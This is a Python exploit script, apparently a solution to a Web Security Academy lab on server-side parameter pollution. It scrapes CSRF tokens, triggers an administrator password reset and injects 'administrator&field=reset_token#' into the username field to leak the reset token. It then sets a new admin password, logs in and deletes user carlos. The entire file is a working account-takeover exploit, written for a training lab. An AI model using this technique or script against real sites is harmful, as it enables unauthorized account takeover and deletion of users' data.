import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import secrets

# Disable SSL warnings to prevent unnecessary messages
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Exploiting server-side parameter pollution in a query string

def extract_reset_token(target_host, session):
    try:
        # Step 1: Extract CSRF token from the password reset page
        url = "https://" + target_host + "/forgot-password"
        response_csrf = session.get(url, verify=False)
        
        # Check if the host is responding
        if response_csrf.status_code == 504:
            print('(!) Host down.')
            sys.exit(-1)
        
        # Parse the CSRF token from the response HTML
        soup = BeautifulSoup(response_csrf.text, "html.parser")
        csrf = soup.find("input", {"name": "csrf"})['value']
        
        # Step 2: Send password reset request for administrator
        data_reset_password = {"csrf": csrf, "username": "administrator"}
        response_reset_password = session.post(url, verify=False, data=data_reset_password)
        
        if response_reset_password.status_code == 200:
            print("(+) Administrator password reset token sent.")
            
            # Step 3: Extract reset token using parameter pollution technique
            data_reset_token = {"csrf": csrf, "username": "administrator&field=reset_token#".encode()}
            response_reset_token = session.post(url, verify=False, data=data_reset_token)
            
            # Extract and return the reset token from the JSON response
            return response_reset_token.json()["result"]  
        else:
            print('(!) Error during password reset.')
            sys.exit()
    except Exception as err:
        print(f'(!) {err}')
        sys.exit()

def reset_password(target_host, session, reset_token):
    # Step 4: Use the extracted reset token to set a new administrator password
    url = f"https://{target_host}/forgot-password?reset_token={reset_token}"
    response_csrf = session.get(url, verify=False)
    
    # Parse CSRF token required for setting a new password
    soup = BeautifulSoup(response_csrf.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})['value']
    
    # Generate a new secure random password
    password = secrets.token_hex(8)
    data = {"csrf": csrf, "reset_token": reset_token, "new-password-1": password, "new-password-2": password}
    
    # Submit the new password
    response_new_password = session.post(url, verify=False, data=data, allow_redirects=False)
    
    if response_new_password.status_code == 302:
        print('(+) New password set successfully.')
        print(f"(+) Password: {password}")
        return password
    else:
        print('(!) Error while setting new password.')

def server_side_parameter_pollution(target_host, session, new_password):
    # Step 5: Log in to the administrator account using the new password
    url = "https://" + target_host + "/login"
    response_csrf = session.get(url, verify=False)
    
    # Parse CSRF token for authentication
    soup = BeautifulSoup(response_csrf.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})['value']
    
    # Submit login credentials
    data = {"csrf": csrf, "username": "administrator", "password": new_password}
    login_response = session.post(url, data=data, verify=False, allow_redirects=False)
    
    if login_response.status_code == 302:
        print('(+) Logged in successfully as administrator.')
        administrator_session = login_response.cookies.values()[0]
        print(f"(+) Administrator Session: {administrator_session}")
        
        # Step 6: Delete user "carlos"
        print('(+) Deleting user carlos...')
        url_delete_user = "https://" + target_host + "/admin/delete?username=carlos"
        
        response_delete_user = session.get(url_delete_user, verify=False, allow_redirects=False)
        
        if response_delete_user.status_code == 302:
            print('(+) User deleted successfully.')
            sys.exit()
        else:
            print("(!) Error while trying to delete user.")
            sys.exit()
    else:
        print("(!) Error while trying to log in.")
        sys.exit()

def main():
    # Ensure correct usage with a single argument (target URL)
    if len(sys.argv) != 2:
        print(f'(!) Usage: {sys.argv[0]} <url>')
        print(f'(!) Example: {sys.argv[0]} xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net')
        sys.exit()
    
    # Initialize variables and start the attack sequence
    target_host = sys.argv[1]
    session = requests.session()
    print('(+) Starting ...... ')
    
    # Execute attack steps in order
    reset_token = extract_reset_token(target_host, session)
    new_password = reset_password(target_host, session, reset_token)
    server_side_parameter_pollution(target_host, session, new_password)

if __name__ == "__main__":
    main()
